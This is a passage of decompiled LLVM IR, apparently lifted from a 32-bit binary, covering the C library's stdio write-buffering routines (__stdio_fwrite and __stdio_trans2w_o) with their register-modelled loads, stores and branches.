  %v1_8055907 = trunc i32 %v1_8055904 to i16
  %v3_8055907 = inttoptr i32 %v0_80558fe to i16*
  store i16 %v1_8055907, i16* %v3_8055907, align 2
  %v0_805590b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805590b = add i32 %v0_805590b, 12
  %v2_805590b = inttoptr i32 %v1_805590b to i32*
  %v3_805590b = load i32, i32* %v2_805590b, align 4
  %v1_805590e = load i32, i32* @edx, align 4
  %v2_805590e = sub i32 %v3_805590b, %v1_805590e
  %v12_805590e = icmp eq i32 %v2_805590e, 0
  store i1 %v12_805590e, i1* %zf.global-to-local, align 1
  store i32 %v2_805590e, i32* %eax.global-to-local, align 4
  %v4_8055934.pre = load i32, i32* @ebx, align 4
  br i1 %v12_805590e, label %dec_label_pc_8055934, label %dec_label_pc_8055912

dec_label_pc_8055912:                             ; preds = %dec_label_pc_80558fe
  %v12_8055912 = icmp eq i32 %v2_805590e, %v4_8055934.pre
  store i1 %v12_8055912, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_805590e, %v4_8055934.pre
  %v3_8055914 = load i32, i32* %esi.global-to-local, align 4
  %v5_8055914 = select i1 %tmp, i32 %v2_805590e, i32 %v3_8055914
  store i32 %v5_8055914, i32* %esi.global-to-local, align 4
  %v0_8055917.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8055917

dec_label_pc_8055917:                             ; preds = %dec_label_pc_8055929, %dec_label_pc_8055912
  %v2_805591b = phi i32 [ %v1_8055925, %dec_label_pc_8055929 ], [ %v1_805590e, %dec_label_pc_8055912 ]
  %v4_8055917 = phi i32 [ %v4_8055917.pre, %dec_label_pc_8055929 ], [ %v2_805590e, %dec_label_pc_8055912 ]
  %v0_8055917 = phi i32 [ %v1_8055929, %dec_label_pc_8055929 ], [ %v0_8055917.pre, %dec_label_pc_8055912 ]
  %v1_8055917 = inttoptr i32 %v0_8055917 to i8*
  %v2_8055917 = load i8, i8* %v1_8055917, align 1
  %v3_8055917 = zext i8 %v2_8055917 to i32
  %v5_8055917 = and i32 %v4_8055917, -256
  %v6_8055917 = or i32 %v3_8055917, %v5_8055917
  store i32 %v6_8055917, i32* %eax.global-to-local, align 4
  %v10_8055919 = icmp eq i8 %v2_8055917, 10
  store i1 %v10_8055919, i1* %zf.global-to-local, align 1
  %v3_805591b = inttoptr i32 %v2_805591b to i8*
  store i8 %v2_8055917, i8* %v3_805591b, align 1
  %v0_805591d = load i1, i1* %zf.global-to-local, align 1
  %v1_805591d = icmp eq i1 %v0_805591d, false
  br i1 %v1_805591d, label %dec_label_pc_8055925, label %dec_label_pc_805591f

dec_label_pc_805591f:                             ; preds = %dec_label_pc_8055917
  %v0_805591f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805591f = add i32 %v0_805591f, 1
  %v2_805591f = inttoptr i32 %v1_805591f to i8*
  %v3_805591f = load i8, i8* %v2_805591f, align 1
  %v4_805591f = urem i8 %v3_805591f, 2
  %v5_805591f = icmp eq i8 %v4_805591f, 0
  store i1 %v5_805591f, i1* %zf.global-to-local, align 1
  %v1_8055923 = icmp eq i1 %v5_805591f, false
  br i1 %v1_8055923, label %dec_label_pc_805591f.dec_label_pc_805592c_crit_edge, label %dec_label_pc_8055925

dec_label_pc_805591f.dec_label_pc_805592c_crit_edge: ; preds = %dec_label_pc_805591f
  %v0_805592c.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805592c

dec_label_pc_8055925:                             ; preds = %dec_label_pc_805591f, %dec_label_pc_8055917
  %v0_8055925 = load i32, i32* @edx, align 4
  %v1_8055925 = add i32 %v0_8055925, 1
  store i32 %v1_8055925, i32* @edx, align 4
  %v0_8055926 = load i32, i32* %esi.global-to-local, align 4
  %v1_8055926 = add i32 %v0_8055926, -1
  %v8_8055926 = icmp eq i32 %v1_8055926, 0
  store i1 %v8_8055926, i1* %zf.global-to-local, align 1
  store i32 %v1_8055926, i32* %esi.global-to-local, align 4
  br i1 %v8_8055926, label %dec_label_pc_8055925.dec_label_pc_805592c_crit_edge, label %dec_label_pc_8055929

dec_label_pc_8055925.dec_label_pc_805592c_crit_edge: ; preds = %dec_label_pc_8055925
  %v1_805592c.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805592c

dec_label_pc_8055929:                             ; preds = %dec_label_pc_8055925
  %v0_8055929 = load i32, i32* @edi, align 4
  %v1_8055929 = add i32 %v0_8055929, 1
  %v8_8055929 = icmp eq i32 %v1_8055929, 0
  store i1 %v8_8055929, i1* %zf.global-to-local, align 1
  store i32 %v1_8055929, i32* @edi, align 4
  %v4_8055917.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055917

dec_label_pc_805592c:                             ; preds = %dec_label_pc_8055925.dec_label_pc_805592c_crit_edge, %dec_label_pc_805591f.dec_label_pc_805592c_crit_edge
  %v1_805592c = phi i32 [ %v0_805591f, %dec_label_pc_805591f.dec_label_pc_805592c_crit_edge ], [ %v1_805592c.pre, %dec_label_pc_8055925.dec_label_pc_805592c_crit_edge ]
  %v0_805592c = phi i32 [ %v0_805592c.pre, %dec_label_pc_805591f.dec_label_pc_805592c_crit_edge ], [ %v1_8055925, %dec_label_pc_8055925.dec_label_pc_805592c_crit_edge ]
  %v2_805592c = add i32 %v1_805592c, 16
  %v3_805592c = inttoptr i32 %v2_805592c to i32*
  store i32 %v0_805592c, i32* %v3_805592c, align 4
  %v0_805592f = load i32, i32* @edx, align 4
  %v1_805592f = load i32, i32* %ebp.global-to-local, align 4
  %v2_805592f = add i32 %v1_805592f, 8
  %v3_805592f = inttoptr i32 %v2_805592f to i32*
  %v4_805592f = load i32, i32* %v3_805592f, align 4
  %v5_805592f = sub i32 %v0_805592f, %v4_805592f
  store i32 %v5_805592f, i32* @edx, align 4
  %v0_8055932 = load i32, i32* @ebx, align 4
  %v2_8055932 = sub i32 %v0_8055932, %v5_805592f
  %v12_8055932 = icmp eq i32 %v2_8055932, 0
  store i1 %v12_8055932, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8055934

dec_label_pc_8055934:                             ; preds = %dec_label_pc_80558fe, %dec_label_pc_805592c
  %v4_8055934 = phi i32 [ %v2_8055932, %dec_label_pc_805592c ], [ %v4_8055934.pre, %dec_label_pc_80558fe ]
  %v5_8055934 = sub i32 %arg3, %v4_8055934
  %v15_8055934 = icmp eq i32 %v5_8055934, 0
  store i1 %v15_8055934, i1* %zf.global-to-local, align 1
  %v0_805593c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055938

dec_label_pc_8055938:                             ; preds = %dec_label_pc_80558f8, %entry, %dec_label_pc_8055934
  %v0_805593c = phi i32 [ %v0_805593c.pre, %dec_label_pc_8055934 ], [ %v15_80558c8, %entry ], [ %v15_80558c8, %dec_label_pc_80558f8 ]
  %stack_var_12.0 = phi i32 [ %v5_8055934, %dec_label_pc_8055934 ], [ 0, %entry ], [ %arg3, %dec_label_pc_80558f8 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_805593c = icmp eq i32 %v0_805593c, -12
  store i1 %v9_805593c, i1* %zf.global-to-local, align 1
  store i32 %v0_80558c7, i32* @ebx, align 4
  store i32 %v0_80558c5, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_8055929, { 1, 2, 0 }
  uselistorder i32 %v1_8055926, { 1, 0 }
  uselistorder i32 %v1_8055925, { 0, 2, 1 }
  uselistorder i8 %v2_8055917, { 1, 0, 2 }
  uselistorder i32 %v4_8055934.pre, { 2, 0, 1 }
  uselistorder i32 %v2_805590e, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_80558fa, { 1, 0 }
  uselistorder i32 %v2_80558f8, { 2, 3, 0, 1 }
  uselistorder i32 %v5_80558ec, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 1, 5, 2, 3, 4, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 3, 0, 1, 2 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_8055938, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055934, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055944 = load i32, i32* @ebp, align 4
  %v0_8055945 = load i32, i32* @edi, align 4
  %v0_8055946 = load i32, i32* @esi, align 4
  %v0_8055947 = load i32, i32* @ebx, align 4
  store i32 %v0_8055947, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_8055957 = add i32 %arg3, 1
  %v2_8055957 = inttoptr i32 %v1_8055957 to i8*
  %v3_8055957 = load i8, i8* %v2_8055957, align 1
  %v4_8055957 = and i8 %v3_8055957, 2
  %v5_8055957 = icmp eq i8 %v4_8055957, 0
  %v1_805595b = icmp eq i1 %v5_8055957, false
  br i1 %v1_805595b, label %dec_label_pc_8055a0c, label %dec_label_pc_8055961

dec_label_pc_8055961:                             ; preds = %entry
  %v1_8055961 = add i32 %arg3, 4
  %v2_8055961 = inttoptr i32 %v1_8055961 to i32*
  %v3_8055961 = load i32, i32* %v2_8055961, align 4
  %v13_8055961 = icmp eq i32 %v3_8055961, -2
  %v1_8055965 = add i32 %arg3, 16
  %v2_8055965 = inttoptr i32 %v1_8055965 to i32*
  %v3_8055965 = load i32, i32* %v2_8055965, align 4
  store i32 %v3_8055965, i32* @edx, align 4
  %v1_8055968 = add i32 %arg3, 12
  %v2_8055968 = inttoptr i32 %v1_8055968 to i32*
  %v3_8055968 = load i32, i32* %v2_8055968, align 4
  store i32 %v3_8055968, i32* %eax.global-to-local, align 4
  %v1_805596b = icmp eq i1 %v13_8055961, false
  %v2_805598a = sub i32 %v3_8055968, %v3_8055965
  br i1 %v1_805596b, label %dec_label_pc_805598a, label %dec_label_pc_805596d

dec_label_pc_805596d:                             ; preds = %dec_label_pc_8055961
  %tmp = icmp uge i32 %v2_805598a, %arg2
  %v5_8055974 = select i1 %tmp, i32 %arg2, i32 %v2_805598a
  store i32 %v5_8055974, i32* %ebx.global-to-local, align 4
  %v3_805597a = inttoptr i32 %v3_8055965 to i16*
  %v4_805597a = call i32 @memcpy(i16* %v3_805597a, i32 %v5_8055974, i32 %v3_8055968)
  store i32 %v4_805597a, i32* %eax.global-to-local, align 4
  %v0_8055982 = load i32, i32* @esi, align 4
  %v1_8055982 = add i32 %v0_8055982, 16
  %v2_8055982 = inttoptr i32 %v1_8055982 to i32*
  %v3_8055982 = load i32, i32* %v2_8055982, align 4
  %v4_8055982 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8055982 = add i32 %v4_8055982, %v3_8055982
  store i32 %v5_8055982, i32* %v2_8055982, align 4
  br label %dec_label_pc_8055a24

dec_label_pc_805598a:                             ; preds = %dec_label_pc_8055961
  store i32 %v2_805598a, i32* %eax.global-to-local, align 4
  %v6_805598e = icmp ult i32 %v2_805598a, %arg2
  br i1 %v6_805598e, label %dec_label_pc_80559f3, label %dec_label_pc_8055990

dec_label_pc_8055990:                             ; preds = %dec_label_pc_805598a
  %v0_8055990 = load i32, i32* @ecx, align 4
  %v3_8055994 = inttoptr i32 %v3_8055965 to i16*
  %v4_8055994 = call i32 @memcpy(i16* %v3_8055994, i32 %arg2, i32 %v0_8055990)
  store i32 %v4_8055994, i32* %eax.global-to-local, align 4
  %v0_805599c = load i32, i32* @esi, align 4
  %v1_805599c = add i32 %v0_805599c, 16
  %v2_805599c = inttoptr i32 %v1_805599c to i32*
  %v3_805599c = load i32, i32* %v2_805599c, align 4
  %v4_805599c = load i32, i32* @edi, align 4
  %v5_805599c = add i32 %v4_805599c, %v3_805599c
  store i32 %v5_805599c, i32* %v2_805599c, align 4
  %v0_805599f = load i32, i32* @esi, align 4
  %v1_805599f = add i32 %v0_805599f, 1
  %v2_805599f = inttoptr i32 %v1_805599f to i8*
  %v3_805599f = load i8, i8* %v2_805599f, align 1
  %v4_805599f = urem i8 %v3_805599f, 2
  %v5_805599f = icmp eq i8 %v4_805599f, 0
  br i1 %v5_805599f, label %dec_label_pc_8055a24, label %dec_label_pc_80559a5

dec_label_pc_80559a5:                             ; preds = %dec_label_pc_8055990
  %v0_80559a5 = load i32, i32* @edx, align 4
  %v0_80559a6 = load i32, i32* @edi, align 4
  %v4_80559aa = call i32 @memrchr(i8 10, i32 %v0_80559a6, i32 %v0_80559a5)
  store i32 %v4_80559aa, i32* %eax.global-to-local, align 4
  %v1_80559b2 = icmp eq i32 %v4_80559aa, 0
  br i1 %v1_80559b2, label %dec_label_pc_8055a24, label %dec_label_pc_80559b6

dec_label_pc_80559b6:                             ; preds = %dec_label_pc_80559a5
  %v0_80559b9 = load i32, i32* @esi, align 4
  %v1_80559ba = call i32 @__stdio_wcommit(i32 %v0_80559b9)
  store i32 %v1_80559ba, i32* %eax.global-to-local, align 4
  %v1_80559c2 = icmp eq i32 %v1_80559ba, 0
  br i1 %v1_80559c2, label %dec_label_pc_8055a24, label %dec_label_pc_80559c6

dec_label_pc_80559c6:                             ; preds = %dec_label_pc_80559b6
  %v0_80559c6 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80559c6, %v1_80559ba
  %v5_80559ca = select i1 %tmp20, i32 %v0_80559c6, i32 %v1_80559ba
  store i32 %v5_80559ca, i32* %ebx.global-to-local, align 4
  %v2_80559cf = sub i32 %v0_80559c6, %v5_80559ca
  store i32 %v2_80559cf, i32* %eax.global-to-local, align 4
  %v0_80559d1 = load i32, i32* @ebp, align 4
  %v2_80559d1 = add i32 %v0_80559d1, %v2_80559cf
  store i32 %v2_80559d1, i32* %ebp.global-to-local, align 4
  %v4_80559d8 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_80559ca, i32 %v2_80559cf)
  store i32 %v4_80559d8, i32* %eax.global-to-local, align 4
  %v1_80559e0 = icmp eq i32 %v4_80559d8, 0
  store i32 %v4_80559d8, i32* @edx, align 4
  br i1 %v1_80559e0, label %dec_label_pc_8055a24, label %dec_label_pc_80559e6

dec_label_pc_80559e6:                             ; preds = %dec_label_pc_80559c6
  %v0_80559e6 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80559e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80559e6 = sub i32 %v0_80559e6, %v4_80559d8
  %v2_80559ea = add i32 %v2_80559e6, %v1_80559e6
  store i32 %v2_80559ea, i32* %eax.global-to-local, align 4
  %v0_80559ec = load i32, i32* @esi, align 4
  %v1_80559ec = add i32 %v0_80559ec, 16
  %v2_80559ec = inttoptr i32 %v1_80559ec to i32*
  %v3_80559ec = load i32, i32* %v2_80559ec, align 4
  %v5_80559ec = sub i32 %v3_80559ec, %v2_80559ea
  store i32 %v5_80559ec, i32* %v2_80559ec, align 4
  %v0_80559ef = load i32, i32* @edi, align 4
  %v1_80559ef = load i32, i32* %eax.global-to-local, align 4
  %v2_80559ef = sub i32 %v0_80559ef, %v1_80559ef
  store i32 %v2_80559ef, i32* @edi, align 4
  br label %dec_label_pc_8055a24

dec_label_pc_80559f3:                             ; preds = %dec_label_pc_805598a
  %v2_80559f3 = add i32 %arg3, 8
  %v3_80559f3 = inttoptr i32 %v2_80559f3 to i32*
  %v4_80559f3 = load i32, i32* %v3_80559f3, align 4
  %v15_80559f3 = icmp eq i32 %v3_8055965, %v4_80559f3
  br i1 %v15_80559f3, label %dec_label_pc_8055a0c, label %dec_label_pc_80559f8

dec_label_pc_80559f8:                             ; preds = %dec_label_pc_80559f3
  %v1_80559fc = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_80559fc, i32* %eax.global-to-local, align 4
  %v1_8055a04 = icmp eq i32 %v1_80559fc, 0
  br i1 %v1_8055a04, label %dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge, label %dec_label_pc_8055a08

dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge: ; preds = %dec_label_pc_80559f8
  %v0_8055a0c.pre = load i32, i32* @edi, align 4
  %v0_8055a14.pre = load i32, i32* @esi, align 4
  %v2_8055a1b.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055a0c

dec_label_pc_8055a08:                             ; preds = %dec_label_pc_80559f8
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8055a24

dec_label_pc_8055a0c:                             ; preds = %dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge, %dec_label_pc_80559f3, %entry
  %v2_8055a1b = phi i32 [ %v2_8055a1b.pre, %dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge ], [ %v0_8055947, %dec_label_pc_80559f3 ], [ %v0_8055947, %entry ]
  %v0_8055a14 = phi i32 [ %v0_8055a14.pre, %dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge ], [ %arg3, %dec_label_pc_80559f3 ], [ %arg3, %entry ]
  %v0_8055a0c = phi i32 [ %v0_8055a0c.pre, %dec_label_pc_80559f8.dec_label_pc_8055a0c_crit_edge ], [ %arg2, %dec_label_pc_80559f3 ], [ %arg2, %entry ]
  store i32 %v2_8055a1b, i32* @ebx, align 4
  store i32 %v0_8055945, i32* @edi, align 4
  %v4_8055a1f = inttoptr i32 %v0_8055a14 to i16*
  %v5_8055a1f = call i32 @__stdio_WRITE(i16* %v4_8055a1f, i32 %v0_8055a0c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055a1f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055a24

dec_label_pc_8055a24:                             ; preds = %dec_label_pc_80559c6, %dec_label_pc_80559b6, %dec_label_pc_80559a5, %dec_label_pc_8055990, %dec_label_pc_8055a08, %dec_label_pc_80559e6, %dec_label_pc_805596d, %dec_label_pc_8055a0c
  %v0_8055a27 = load i32, i32* @edi, align 4
  store i32 %v0_8055a27, i32* %eax.global-to-local, align 4
  %v2_8055a29 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055a29, i32* @ebx, align 4
  store i32 %v0_8055946, i32* @esi, align 4
  store i32 %v0_8055945, i32* @edi, align 4
  store i32 %v0_8055944, i32* @ebp, align 4
  ret i32 %v0_8055a27

; uselistorder directives
  uselistorder i32 %v2_80559ea, { 1, 0 }
  uselistorder i32 %v0_80559c6, { 2, 1, 0 }
  uselistorder i32 %v1_80559ba, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805598a, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8055965, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8055945, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8055a24, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055a30 = load i32, i32* @ebx, align 4
  %v4_8055a34 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055a34, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8055a3c = load i16, i16* %arg1, align 2
  %v3_8055a3c = zext i16 %v2_8055a3c to i32
  store i32 %v3_8055a3c, i32* %eax.global-to-local, align 4
  %v2_8055a3f = and i32 %v3_8055a3c, %arg2
  %v3_8055a3f = icmp eq i32 %v2_8055a3f, 0
  %v1_8055a41 = icmp eq i1 %v3_8055a3f, false
  br i1 %v1_8055a41, label %dec_label_pc_8055a4f, label %dec_label_pc_8055a43

dec_label_pc_8055a43:                             ; preds = %entry
  %v1_8055a43 = and i32 %v3_8055a3c, 2176
  %v2_8055a43 = icmp eq i32 %v1_8055a43, 0
  %v1_8055a48 = icmp eq i1 %v2_8055a43, false
  br i1 %v1_8055a48, label %dec_label_pc_8055a57, label %dec_label_pc_8055a4a

dec_label_pc_8055a4a:                             ; preds = %dec_label_pc_8055a43
  %v2_8055a4a = or i32 %v3_8055a3c, %arg2
  store i32 %v2_8055a4a, i32* %eax.global-to-local, align 4
  %v1_8055a4c = trunc i32 %v2_8055a4a to i16
  store i16 %v1_8055a4c, i16* %arg1, align 2
  %v0_8055a4f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055a4f

dec_label_pc_8055a4f:                             ; preds = %entry, %dec_label_pc_8055a4a
  %v0_8055a98 = phi i32 [ %v4_8055a34, %entry ], [ %v0_8055a4f.pre, %dec_label_pc_8055a4a ]
  %v1_8055a4f = inttoptr i32 %v0_8055a98 to i16*
  %v2_8055a4f = load i16, i16* %v1_8055a4f, align 2
  %v3_8055a4f = zext i16 %v2_8055a4f to i32
  store i32 %v3_8055a4f, i32* %edx.global-to-local, align 4
  %v2_8055a52 = and i16 %v2_8055a4f, 32
  %v3_8055a52 = icmp eq i16 %v2_8055a52, 0
  br i1 %v3_8055a52, label %dec_label_pc_8055a6f, label %dec_label_pc_8055a57

dec_label_pc_8055a57:                             ; preds = %dec_label_pc_8055a4f, %dec_label_pc_8055a43
  %v1_8055a57 = call i32 @__errno_location(i32 %v0_8055a30)
  store i32 %v1_8055a57, i32* %eax.global-to-local, align 4
  %v1_8055a5c = inttoptr i32 %v1_8055a57 to i32*
  store i32 9, i32* %v1_8055a5c, align 4
  br label %dec_label_pc_8055a62

dec_label_pc_8055a62:                             ; preds = %dec_label_pc_8055a86, %dec_label_pc_8055a57
  %v0_8055a62 = load i32, i32* @ebx, align 4
  %v1_8055a62 = inttoptr i32 %v0_8055a62 to i32*
  %v2_8055a62 = load i32, i32* %v1_8055a62, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8055a67 = or i32 %v2_8055a62, 8
  store i32 %v1_8055a67, i32* %eax.global-to-local, align 4
  %v1_8055a6a = trunc i32 %v1_8055a67 to i16
  %v3_8055a6a = inttoptr i32 %v0_8055a62 to i16*
  store i16 %v1_8055a6a, i16* %v3_8055a6a, align 2
  br label %dec_label_pc_8055ad1

dec_label_pc_8055a6f:                             ; preds = %dec_label_pc_8055a4f
  %v2_8055a6f = urem i16 %v2_8055a4f, 4
  %v3_8055a6f = icmp eq i16 %v2_8055a6f, 0
  br i1 %v3_8055a6f, label %dec_label_pc_8055ab9, label %dec_label_pc_8055a74

dec_label_pc_8055a74:                             ; preds = %dec_label_pc_8055a6f
  %v2_8055a74 = and i32 %v3_8055a4f, 4
  %v3_8055a74 = icmp eq i32 %v2_8055a74, 0
  %v1_8055a77 = icmp eq i1 %v3_8055a74, false
  br i1 %v1_8055a77, label %dec_label_pc_8055aa5, label %dec_label_pc_8055a79

dec_label_pc_8055a79:                             ; preds = %dec_label_pc_8055a74
  %v1_8055a79 = add i32 %v0_8055a98, 20
  %v2_8055a79 = inttoptr i32 %v1_8055a79 to i32*
  %v3_8055a79 = load i32, i32* %v2_8055a79, align 4
  store i32 %v3_8055a79, i32* %eax.global-to-local, align 4
  %v2_8055a7c = add i32 %v0_8055a98, 16
  %v3_8055a7c = inttoptr i32 %v2_8055a7c to i32*
  %v4_8055a7c = load i32, i32* %v3_8055a7c, align 4
  %v15_8055a7c = icmp eq i32 %v3_8055a79, %v4_8055a7c
  %v1_8055a7f = icmp eq i1 %v15_8055a7c, false
  br i1 %v1_8055a7f, label %dec_label_pc_8055a86, label %dec_label_pc_8055a81

dec_label_pc_8055a81:                             ; preds = %dec_label_pc_8055a79
  %v2_8055a81 = and i32 %v3_8055a4f, 2
  %v3_8055a81 = icmp eq i32 %v2_8055a81, 0
  br i1 %v3_8055a81, label %dec_label_pc_8055aa5, label %dec_label_pc_8055a86

dec_label_pc_8055a86:                             ; preds = %dec_label_pc_8055a81, %dec_label_pc_8055a79
  %v1_8055a86 = and i32 %v3_8055a4f, 1024
  store i32 %v1_8055a86, i32* %edx.global-to-local, align 4
  %tmp15 = udiv i32 %v1_8055a86, 1024
  %tmp16 = xor i32 %tmp15, 3
  store i32 %tmp16, i32* %eax.global-to-local, align 4
  %v5_8055a99 = call i32 @__GI_fseek(i32 %v0_8055a98, i32 0, i32 %tmp16, i32 %v1_8055a86)
  store i32 %v5_8055a99, i32* %eax.global-to-local, align 4
  %v1_8055aa1 = icmp eq i32 %v5_8055a99, 0
  %v1_8055aa3 = icmp eq i1 %v1_8055aa1, false
  br i1 %v1_8055aa3, label %dec_label_pc_8055a62, label %dec_label_pc_8055a86.dec_label_pc_8055aa5_crit_edge

dec_label_pc_8055a86.dec_label_pc_8055aa5_crit_edge: ; preds = %dec_label_pc_8055a86
  %v0_8055aa5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055aa5

dec_label_pc_8055aa5:                             ; preds = %dec_label_pc_8055a86.dec_label_pc_8055aa5_crit_edge, %dec_label_pc_8055a81, %dec_label_pc_8055a74
  %v2_8055aaa = phi i32 [ %v0_8055aa5.pre, %dec_label_pc_8055a86.dec_label_pc_8055aa5_crit_edge ], [ %v0_8055a98, %dec_label_pc_8055a81 ], [ %v0_8055a98, %dec_label_pc_8055a74 ]
  %v1_8055aa5 = inttoptr i32 %v2_8055aaa to i32*
  %v2_8055aa5 = load i32, i32* %v1_8055aa5, align 4
  %v1_8055aa7 = and i32 %v2_8055aa5, -4
  store i32 %v1_8055aa7, i32* %eax.global-to-local, align 4
  %v1_8055aaa = trunc i32 %v1_8055aa7 to i16
  %v3_8055aaa = inttoptr i32 %v2_8055aaa to i16*
  store i16 %v1_8055aaa, i16* %v3_8055aaa, align 2
  %v0_8055aad = load i32, i32* @ebx, align 4
  %v1_8055aad = add i32 %v0_8055aad, 8
  %v2_8055aad = inttoptr i32 %v1_8055aad to i32*
  %v3_8055aad = load i32, i32* %v2_8055aad, align 4
  store i32 %v3_8055aad, i32* %eax.global-to-local, align 4
  %v2_8055ab0 = add i32 %v0_8055aad, 24
  %v3_8055ab0 = inttoptr i32 %v2_8055ab0 to i32*
  store i32 %v3_8055aad, i32* %v3_8055ab0, align 4
  %v0_8055ab3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055ab3 = load i32, i32* @ebx, align 4
  %v2_8055ab3 = add i32 %v1_8055ab3, 16
  %v3_8055ab3 = inttoptr i32 %v2_8055ab3 to i32*
  store i32 %v0_8055ab3, i32* %v3_8055ab3, align 4
  %v0_8055ab6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055ab6 = load i32, i32* @ebx, align 4
  %v2_8055ab6 = add i32 %v1_8055ab6, 20
  %v3_8055ab6 = inttoptr i32 %v2_8055ab6 to i32*
  store i32 %v0_8055ab6, i32* %v3_8055ab6, align 4
  %v0_8055ab9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055ab9

dec_label_pc_8055ab9:                             ; preds = %dec_label_pc_8055a6f, %dec_label_pc_8055aa5
  %v2_8055ac0 = phi i32 [ %v0_8055a98, %dec_label_pc_8055a6f ], [ %v0_8055ab9.pre, %dec_label_pc_8055aa5 ]
  %v1_8055ab9 = inttoptr i32 %v2_8055ac0 to i32*
  %v2_8055ab9 = load i32, i32* %v1_8055ab9, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8055abd = or i32 %v2_8055ab9, 64
  store i32 %v1_8055abd, i32* %eax.global-to-local, align 4
  %v1_8055ac0 = trunc i32 %v1_8055abd to i16
  %v3_8055ac0 = inttoptr i32 %v2_8055ac0 to i16*
  store i16 %v1_8055ac0, i16* %v3_8055ac0, align 2
  %v0_8055ac3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055ac3 = urem i32 %v0_8055ac3, 65536
  store i32 %v1_8055ac3, i32* %eax.global-to-local, align 4
  %v3_8055ac6 = and i32 %v0_8055ac3, 2816
  %v4_8055ac6 = icmp eq i32 %v3_8055ac6, 0
  %v1_8055ac9 = icmp eq i1 %v4_8055ac6, false
  br i1 %v1_8055ac9, label %dec_label_pc_8055ad1, label %dec_label_pc_8055acb

dec_label_pc_8055acb:                             ; preds = %dec_label_pc_8055ab9
  %v0_8055acb = load i32, i32* @ebx, align 4
  %v1_8055acb = add i32 %v0_8055acb, 12
  %v2_8055acb = inttoptr i32 %v1_8055acb to i32*
  %v3_8055acb = load i32, i32* %v2_8055acb, align 4
  store i32 %v3_8055acb, i32* %eax.global-to-local, align 4
  %v2_8055ace = add i32 %v0_8055acb, 28
  %v3_8055ace = inttoptr i32 %v2_8055ace to i32*
  store i32 %v3_8055acb, i32* %v3_8055ace, align 4
  br label %dec_label_pc_8055ad1

dec_label_pc_8055ad1:                             ; preds = %dec_label_pc_8055ab9, %dec_label_pc_8055a62, %dec_label_pc_8055acb
  %v0_8055ad1 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055ad1, i32* %eax.global-to-local, align 4
  %v2_8055ad3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055ad3, i32* %edx.global-to-local, align 4
  store i32 %v0_8055a30, i32* @ebx, align 4
